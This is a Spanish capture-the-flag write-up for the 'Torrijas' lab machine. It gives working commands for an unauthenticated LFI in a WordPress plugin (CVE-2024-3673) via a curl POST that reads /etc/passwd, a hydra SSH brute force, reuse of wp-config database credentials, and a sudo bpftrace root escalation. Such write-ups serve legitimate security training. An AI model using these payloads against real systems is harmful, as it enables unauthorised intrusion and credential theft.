---
title: "Torrijas - TheHackerLabs"
date: 2025-08-14
draft: false
slug: "THL-writeup-torrijas"
excerpt: "Esta fue una máquina sencilla. Después de analizar los escaneos, comenzamos por analizar la página web activa en el puerto 80. Al no encontrar nada importante, aplicamos Fuzzing con lo que descubrimos un directorio oculto que resulta ser una página hecha en WordPress. Enumeramos la página de WordPress con WPScan, descubriendo un plugin vulnerable que permite aplicar Local File Inclusion (LFI) Unauthenticated. Utilizando un Exploit de GitHub, aplicamos esta vulnerabilidad para poder leer el /etc/passwd, encontrando así usuarios a los que les aplicamos fuerza bruta. Ocupamos uno de estos usuarios para entrar vía SSH a la máquina. Dentro, encontramos el archivo wp-config.php que contiene credenciales de acceso para el servicio MySQL, que enumeramos y encontramos la contraseña de otro usuario de la máquina, al cual nos autenticamos. Como este nuevo usuario, descubrimos que tiene privilegios sudoers como Root en el binario bpftrace. Utilizamos la guía de GTFOBins para usar un comando que nos permite escalar privilegios y convertirnos en Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "MySQL", "WordPress", "Web Enumeration", "Fuzzing", "WordPress Enumeration", "WordPress Plugin web-directory-free Exploitation (CVE-2024-3673)", "CVE-2024-3673", "Local File Inclusion (LFI) Unauthenticated", "Brute Force Attack", "MySQL Enumeration", "Password Reuse", "Abusing Sudoers Privileges", "Abusing Sudoers Privileges On bpftrace Binary", "Privesc - Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges On bpftrace Binary", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "wpscan"
  - "wget"
  - "chmod"
  - "python3"
  - "curl"
  - "sed"
  - "grep"
  - "cut"
  - "hydra"
  - "ssh"
  - "find"
  - "head"
  - "cat"
  - "mysql"
  - "su"
  - "sudo"
  - "bpftrace"
links:
  - "https://github.com/Nxploited/CVE-2024-3673"
  - "https://gtfobins.github.io/gtfobins/bpftrace/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-torrijas/torrijas.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.40
PING 192.168.100.40 (192.168.100.40) 56(84) bytes of data.
64 bytes from 192.168.100.40: icmp_seq=1 ttl=64 time=1.18 ms
64 bytes from 192.168.100.40: icmp_seq=2 ttl=64 time=1.10 ms
64 bytes from 192.168.100.40: icmp_seq=3 ttl=64 time=0.824 ms
64 bytes from 192.168.100.40: icmp_seq=4 ttl=64 time=0.742 ms

--- 192.168.100.40 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3027ms
rtt min/avg/max/mdev = 0.742/0.961/1.180/0.183 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.40 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 12:38 CST
Initiating ARP Ping Scan at 12:38
Scanning 192.168.100.40 [1 port]
Completed ARP Ping Scan at 12:38, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:38
Scanning 192.168.100.40 [65535 ports]
Discovered open port 3306/tcp on 192.168.100.40
Discovered open port 22/tcp on 192.168.100.40
Discovered open port 80/tcp on 192.168.100.40
Completed SYN Stealth Scan at 12:39, 7.76s elapsed (65535 total ports)
Nmap scan report for 192.168.100.40
Host is up, received arp-response (0.00079s latency).
Scanned at 2025-08-14 12:38:58 CST for 7s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.03 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 3 puertos abiertos, pero ver público el **puerto 3306** que es del **servicio MySQL** es extraño.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,3306 192.168.100.40 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 12:39 CST
Nmap scan report for 192.168.100.40
Host is up (0.00092s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)

| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))

|_http-title: torrija.thl
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql   MariaDB 5.5.5-10.11.6

| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.6-MariaDB-0+deb12u1
|   Thread ID: 6
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsTransactions, FoundRows, IgnoreSigpipes, SupportsCompression, ODBCClient, LongColumnFlag, Speaks41ProtocolNew, SupportsLoadDataLocal, ConnectWithDatabase, InteractiveClient, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: bheAS^]9B#%.XSw{'K&v
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:52:5E:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

La página web activa del **puerto 80** muestra un dominio como título, es decir, cuando entremos no nos redirigirá a ningún lado, pero veremos en la pestaña un dominio.

No veo necesario que registremos ese dominio en el `/etc/hosts`, pero puedes hacerlo:
```bash
echo "192.168.100.40 torrija.thl" >> /etc/hosts
```
El escaneo logró identificar la versión de **MySQL** usada. Quizá es vulnerable a un ataque de fuerza bruta, pero primero analicemos la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-torrijas/Captura1.png">
</p>

Parece una página hecha para un restaurante.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-torrijas/Captura2.png">
</p>

Hay bastantes tecnologías usadas, pero no veo algo que nos ayude.

Moviéndonos un poco dentro de la página, no encontraremos algo más que recetas, un formulario y parece que no funciona correctamente el blog y la tienda.

Apliquemos **Fuzzing** para descubrir directorios ocultos.

### Fuzzing {#fuzz}

Primero usemos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.100.40/FUZZ/ -t 300

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.40/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

icons                   [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 48ms]
css                     [Status: 200, Size: 6312, Words: 301, Lines: 42, Duration: 25ms]
wordpress               [Status: 200, Size: 50075, Words: 1417, Lines: 338, Duration: 204ms]
js                      [Status: 200, Size: 4370, Words: 212, Lines: 33, Duration: 32ms]
images                  [Status: 200, Size: 3194, Words: 164, Lines: 28, Duration: 1662ms]
                        [Status: 200, Size: 20833, Words: 6992, Lines: 353, Duration: 10ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 37ms]
:: Progress: [220545/220545] :: Job [1/1] :: 267 req/sec :: Duration: [0:01:29] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.100.40/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.40/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://192.168.100.40/images/]
/wordpress            (Status: 301) [Size: 322] [--> http://192.168.100.40/wordpress/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.100.40/css/]
/js                   (Status: 301) [Size: 315] [--> http://192.168.100.40/js/]
/server-status        (Status: 403) [Size: 280]
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Con las dos herramientas, encontramos un directorio llamado **wordpress**.

Vamos a visitarlo.

### Enumeración de WordPress con WPScan {#WordPress}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-torrijas/Captura3.png">
</p>

La página está en proceso de creación.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-torrijas/Captura4.png">
</p>

Obtuvimos la versión de **WordPress** siendo la **6.7.2**.

Por lo demás, no hay algo más a destacar, entonces, utilicemos la herramienta **wpscan** para buscar plugins vulnerables.

En este caso, le indicaremos que se escanee todos los plugins porque si intentamos buscar solo los vulnerables, no encontrará nada:
```bash
wpscan --url http://192.168.100.40/wordpress --enumerate ap --plugins-detection aggressive --no-banner
[+] URL: http://192.168.100.40/wordpress/ [192.168.100.40]
[+] Started: Thu Aug 14 13:32:40 2025

Interesting Finding(s):

[+] Headers

 | Interesting Entry: Server: Apache/2.4.62 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
...
...
[i] Plugin(s) Identified:

[+] akismet

 | Location: http://192.168.100.40/wordpress/wp-content/plugins/akismet/
 | Last Updated: 2025-07-15T18:17:00.000Z
 | Readme: http://192.168.100.40/wordpress/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.5
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.40/wordpress/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3.6 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.100.40/wordpress/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.100.40/wordpress/wp-content/plugins/akismet/readme.txt

[+] web-directory-free

 | Location: http://192.168.100.40/wordpress/wp-content/plugins/web-directory-free/
 | Last Updated: 2025-08-09T16:46:00.000Z
 | Readme: http://192.168.100.40/wordpress/wp-content/plugins/web-directory-free/readme.txt
 | [!] The version is out of date, the latest version is 1.7.11
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.40/wordpress/wp-content/plugins/web-directory-free/, status: 200
 |
 | Version: 1.7.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.100.40/wordpress/wp-content/plugins/web-directory-free/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Aug 14 13:34:43 2025
[+] Requests Done: 112259
[+] Cached Requests: 8
[+] Data Sent: 32.823 MB
[+] Data Received: 15.209 MB
[+] Memory used: 430.699 MB
[+] Elapsed time: 00:02:02
```

| Parámetros | Descripción |
|---|---|
| *--url*    | Para indicar la URL a escanear. |
| *--enumerate* | Indicando que aplique enumeración, puede ser de usuarios (`u`), de plugins vulnerables (`vp`), de todos los plugins (`ap`), etc. |
| *--plugins-detection* | Para indicar un modo de detección de plugins, se puede elegir entre `passive` (pasivo), `mixed` (mixto) y `agressive` (agresivo). |
| *--no-banner* | Para no mostrar el banner de la herramienta. |

Excelente, encontramos 2 plugins vulnerables.

Utilice la IP de la máquina en lugar del dominio porque parecía tener conflictos, haciendo que el escaneo tardara demasiado.

Si investigas un poco, el plugin **web-directory-free** tiene un Exploit del que nos podemos aprovechar.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Exploit de GitHub: CVE-2024-3673 y Fuerza Bruta al Servicio SSH {#Exploit}

Después de investigar un poco, encontramos un Exploit para el **plugin web-directory-free versión 1.7.2**. 

Dicho Exploit se aprovecha de la vulnerabilidad **Local File Inclusión (LFI)** encontrada en esta versión sin necesidad de estar autenticados.

Aquí la puedes encontrar:
* <a href="https://github.com/Nxploited/CVE-2024-3673" target="_blank">Repositorio de Nxploited: CVE-2024-3673</a>

Descarguémoslo con **wget**:
```bash
wget https://raw.githubusercontent.com/Nxploited/CVE-2024-3673/refs/heads/main/CVE-2024-3673.py
chmod +x CVE-2024-3673.py
```

En el repositorio tenemos un ejemplo de uso, así que apliquémoslo:
```bash
python3 CVE-2024-3673.py --url http://192.168.100.40/wordpress --file ../../../../../etc/passwd
Checking if the site is vulnerable...
The site is vulnerable. Attempting to exploit the vulnerability...
Exploit successful. Extracted content:
{"html":"root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/run\/ircd:\/usr\/sbin\/nologin\n_apt:x:42:65534::\/nonexistent:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:998:998:systemd Network Management:\/:\/usr\/sbin\/nologin\nmessagebus:x:100:107::\/nonexistent:\/usr\/sbin\/nologin\nsshd:x:101:65534::\/run\/sshd:\/usr\/sbin\/nologin\ndebian:x:1000:1000:debian,,,:\/home\/debian:\/bin\/bash\nmysql:x:102:110:MySQL Server,,,:\/nonexistent:\/bin\/false\nprimo:x:1001:1001::\/home\/primo:\/bin\/bash\npremo:x:1002:1002::\/home\/premo:\/bin\/bash\n","hash":"91d75cb01d4a5d829e86bca1858566db","map_markers":"","map_listings":"","hide_show_more_listings_button":1,"sql":"","params":"","base_url":"http:\/\/torrija.thl\/wordpress"}
```
Excelente, funcionó.

Si analizamos el Exploit, podemos replicar el ataque con **curl** haciendo una **petición POST**:
```bash
curl -s -X POST 'http://192.168.100.40/wordpress/wp-admin/admin-ajax.php' -d 'from_set_ajax=1&action=w2dc_controller_request&template=../../../../../etc/passwd'
```

Aplicando unas **expresiones regex** con **sed** y recortando un poco el resultado con **grep** y **curl**, podemos obtener solamente los usuarios de la máquina víctima:
```bash
curl -s -X POST 'http://192.168.100.40/wordpress/wp-admin/admin-ajax.php' -d 'from_set_ajax=1&action=w2dc_controller_request&template=../../../../../etc/passwd' | sed -E 's/\\\//\//g; s/\\n/\n/g; s/.*"html":"//; s/","hash".*//' | grep 'bash' | cut -d: -f1
root
debian
primo
premo
```
Puedes guardarlos en un archivo de texto.

Con esta lista, podemos probar si alguno de estos usuarios es vulnerable a un **ataque de fuerza bruta**.

Resulta que el **usuario debian** y el **usuario premo** son vulnerables:
```bash
hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.40 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-14 15:51:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 28688798 login tries (l:2/p:14344399), ~448263 tries per task
[DATA] attacking ssh://192.168.100.40:22/
[22][ssh] host: 192.168.100.40   login: debian   password: 12345
[STATUS] 14344761.00 tries/min, 14344761 tries in 00:01h, 14344080 to do in 00:01h, 21 active
[STATUS] 7172528.50 tries/min, 14345057 tries in 00:02h, 14343785 to do in 00:02h, 20 active
[STATUS] 4781780.00 tries/min, 14345340 tries in 00:03h, 14343502 to do in 00:03h, 20 active
[22][ssh] host: 192.168.100.40   login: premo   password: *******
1 of 1 target successfully completed, 2 valid passwords found
[WARNING] Writing restore file because 16 final worker threads did not complete until end.
[ERROR] 16 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-14 15:54:43
```

Pero el **usuario premo** es el más importante, pues con él encontraremos la flag del usuario:
```bash
ssh premo@192.168.100.40
premo@192.168.100.40's password: 
Linux Torrija-TheHackersLabs 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
...
Last login: Thu Feb 13 20:08:49 2025
premo@Torrija-TheHackersLabs:~$ whoami
premo
premo@Torrija-TheHackersLabs:~$ ls
user.txt
premo@Torrija-TheHackersLabs:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima y Enumeración del Servicio MySQL {#MySQL}

Revisando todos los archivos del **usuario premo**, vemos que podemos leer el historial de **MySQL**:
```bash
premo@Torrija-TheHackersLabs:~$ ls -la
total 28
drwxr-xr-x 2 premo premo 4096 feb 13 18:01 .
drwxr-xr-x 5 root  root  4096 feb 13 17:28 ..
lrwxrwxrwx 1 root  root     9 feb 13 18:01 .bash_history -> /dev/null
-rw-r--r-- 1 premo premo  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 premo premo 3526 abr 23  2023 .bashrc
-rw------- 1 premo premo  101 feb 13 17:56 .mysql_history
-rw-r--r-- 1 premo premo  807 abr 23  2023 .profile
-r-------- 1 premo premo   36 feb 13 17:49 user.txt
```

Leámoslo:
```bash
premo@Torrija-TheHackersLabs:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
use\040Torrijas;
show\040tables;
select\040*\040from\040primo;
exit;
```
Entró, vio las bases de datos, luego utilizó una BD llamada **Torrijas**, vio sus tablas y leyó el contenido de la tabla **primo**.

Esto ya nos da una idea de qué buscar.

Recordemos que **WordPress** tiene el archivo **wp-config.php**, pues este almacena el usuario y contraseña para entrar al **servicio MySQL**.

Podemos buscarlo con **find**:
```bash
premo@Torrija-TheHackersLabs:~$ find / -type f -name "wp-config.php" 2>/dev/null
/var/www/html/wordpress/wp-config.php
```

Leámoslo:
```bash
premo@Torrija-TheHackersLabs:~$ cat /var/www/html/wordpress/wp-config.php | head -n 40 | sed -n '/\/\*\* The name of the database for WordPress \*\//,$p'
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'afdvasgvfdsabdgvs6a9vd8sv' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
```
Muy bien, tenemos un usuario y contraseña.

Entremos a **MySQL**:
```bash
premo@Torrija-TheHackersLabs:~$ mysql -h localhost -u admin -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
...
MariaDB [(none)]> 
```

Pero si vemos las bases de datos, no encontraremos la BD llamada **Torrijas**:
```bash
MariaDB [(none)]> show databases;
+--------------------+

| Database           |
+--------------------+

| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0,000 sec)
```
Entonces, este usuario no puede acceder a esa BD.

Un usuario por defecto de **MySQL** es el **usuario root**.

Si probamos la misma contraseña con este usuario, lograremos entrar:
```bash
premo@Torrija-TheHackersLabs:~$ mysql -h localhost -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
...
MariaDB [(none)]>
```

Esta vez sí encontraremos la BD **Torrijas**:
```bash
MariaDB [(none)]> show databases;
+--------------------+

| Database           |
+--------------------+

| Torrijas           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
6 rows in set (0,010 sec)
```

Usemos esa BD y veamos sus tablas:
```bash
MariaDB [(none)]> use Torrijas;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [Torrijas]> show tables;
+--------------------+

| Tables_in_Torrijas |
+--------------------+

| primo              |
+--------------------+
1 row in set (0,000 sec)
```

Veamos el contenido de esa tabla:
```bash
MariaDB [Torrijas]> select * from primo;
+----+---------+----------------+

| id | usuario | contraseña     |
+----+---------+----------------+

|  1 | primo   | ************** |
+----+---------+----------------+
1 row in set (0,000 sec)
```
Hemos encontrado la contraseña del otro usuario.

Probémosla:
```bash
premo@Torrija-TheHackersLabs:~$ su primo
Contraseña: 
primo@Torrija-TheHackersLabs:/home/premo$ whoami
primo
```
Ahora somos el **usuario primo**.

### Escalando Privilegios Abusando de Permisos Sudoers sobre Binario bpftrace {#bpftrace}

Veamos qué privilegios tiene este usuario:
```bash
primo@Torrija-TheHackersLabs:/home/premo$ cd ../primo/
primo@Torrija-TheHackersLabs:~$ sudo -l
sudo: unable to resolve host Torrija-TheHackersLabs: Nombre o servicio desconocido
Matching Defaults entries for primo on Torrija-TheHackersLabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User primo may run the following commands on Torrija-TheHackersLabs:
    (root) NOPASSWD: /usr/bin/bpftrace
```
Podemos usar el **binario bpftrace** como **Root**.

Si buscamos en la **guía de GTFOBins**, encontraremos una forma de escalar privilegios:
* <a href="https://gtfobins.github.io/gtfobins/bpftrace/" target="_blank">GTFOBins: bpftrace</a>

Usaremos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-torrijas/Captura5.png">
</p>

Apliquémoslo:
```bash
primo@Torrija-TheHackersLabs:~$ sudo bpftrace -c /bin/bash -e 'END {exit()}'
sudo: unable to resolve host Torrija-TheHackersLabs: Nombre o servicio desconocido
Attaching 1 probe...
root@Torrija-TheHackersLabs:/home/primo# whoami
root
```
Excelente, somos **Root**.

Ya podemos buscar la última flag:
```bash
root@Torrija-TheHackersLabs:/home/primo# cd /root
root@Torrija-TheHackersLabs:~# ls
root.txt
root@Torrija-TheHackersLabs:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
